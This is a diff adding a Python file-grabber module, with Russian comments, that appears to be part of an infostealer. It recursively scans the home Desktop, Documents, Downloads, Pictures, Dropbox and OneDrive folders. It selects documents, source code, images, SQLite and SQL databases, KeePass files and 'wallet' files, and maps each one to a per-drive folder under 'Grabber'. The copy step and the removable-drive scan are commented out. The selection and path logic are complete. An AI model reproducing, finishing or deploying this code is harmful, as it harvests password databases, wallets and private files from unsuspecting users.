@@ -1,0 +1,122 @@
+import os
+import logging
+from pathlib import Path
+
+# Настройки
+GRABBER_SIZE_LIMIT = 5 * 1024 * 1024  # 5 MB
+GRABBER_FILE_TYPES = {
+    "Document": ["pdf", "rtf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "indd", "txt", "json"],
+    "DataBase": ["db", "db3", "db4", "kdb", "kdbx", "sql", "sqlite", "mdf", "mdb", "dsk", "dbf", "wallet", "ini"],
+    "SourceCode": ["c", "cs", "sln", "csproj", "cpp", "asm", "sh", "py", "pyw", "html", "css", "php", "go", "js", "rb",
+                   "pl", "swift", "java", "kt", "kts", "ino"],
+    "Image": ["jpg", "jpeg", "png", "bmp", "psd", "svg", "ai"]
+}
+
+# Настройка логирования
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
+
+
+# Счётчики типов файлов
+class Counter:
+    grabber_documents = 0
+    grabber_databases = 0
+    grabber_source_codes = 0
+    grabber_images = 0
+
+
+def record_file_type(file_type):
+    """ Увеличивает счётчики по типам файлов """
+    if file_type == "Document":
+        Counter.grabber_documents += 1
+    elif file_type == "DataBase":
+        Counter.grabber_databases += 1
+    elif file_type == "SourceCode":
+        Counter.grabber_source_codes += 1
+    elif file_type == "Image":
+        Counter.grabber_images += 1
+    return file_type
+
+
+def detect_file_type(extension):
+    """ Определяет тип файла по расширению """
+    extension = extension.lower().strip(".")
+    for file_type, extensions in GRABBER_FILE_TYPES.items():
+        if extension in extensions:
+            return record_file_type(file_type)
+    return None
+
+
+def grab_file(path, save_path):
+    """ Находит файл, проверяет критерии и выводит путь назначения """
+    try:
+        file = Path(path)
+
+        # Проверка размера файла
+        if file.stat().st_size > GRABBER_SIZE_LIMIT:
+            return
+
+        # Исключение ненужных файлов
+        if file.name.lower() == "desktop.ini":
+            return
+
+        # Проверка типа файла
+        file_type = detect_file_type(file.suffix)
+        if file_type is None:
+            return
+
+        # Создание пути назначения
+        drive_root = Path(file.anchor).name.replace(":", "").upper()
+        relative_path = file.relative_to(file.anchor)
+        destination_dir = save_path / f"DRIVE-{drive_root}" / relative_path.parent
+        destination_file = destination_dir / file.name
+
+        # Вывод информации о файле и его предполагаемом пути копирования
+        print(f"Найден файл: {file}")
+        print(f"Путь для копирования: {destination_file}")
+
+        # Закомментированная строка копирования
+        # shutil.copy2(file, destination_file)
+    except Exception as e:
+        logging.error(f"Ошибка при обработке файла '{path}': {e}")
+
+
+def grab_directory(path, save_path):
+    """ Рекурсивное сканирование директории и обработка файлов """
+    path = Path(path)
+    if not path.exists():
+        return
+
+    try:
+        for item in path.rglob("*"):
+            if item.is_file():
+                grab_file(item, save_path)
+    except Exception as e:
+        logging.error(f"Ошибка при обработке директории '{path}': {e}")
+
+
+def run(s_save_path):
+    """ Запуск основного процесса захвата файлов """
+    save_path = Path(s_save_path)
+    save_path.mkdir(parents=True, exist_ok=True)
+
+    # Список целевых директорий для сканирования
+    target_dirs = [
+        Path.home() / "Desktop",
+        Path.home() / "Pictures",
+        Path.home() / "Documents",
+        Path.home() / "Downloads",
+        Path.home() / "AppData/Roaming/DropBox",
+        Path.home() / "AppData/Roaming/OneDrive"
+    ]
+
+    # Добавление съёмных дисков
+#    for drive in Path('/mnt').iterdir():
+#        if drive.is_mount():
+#            target_dirs.append(drive)
+
+    # Запуск сканирования для каждой директории
+    for target_dir in target_dirs:
+        grab_directory(target_dir, save_path)
+
+
+run("Grabber")
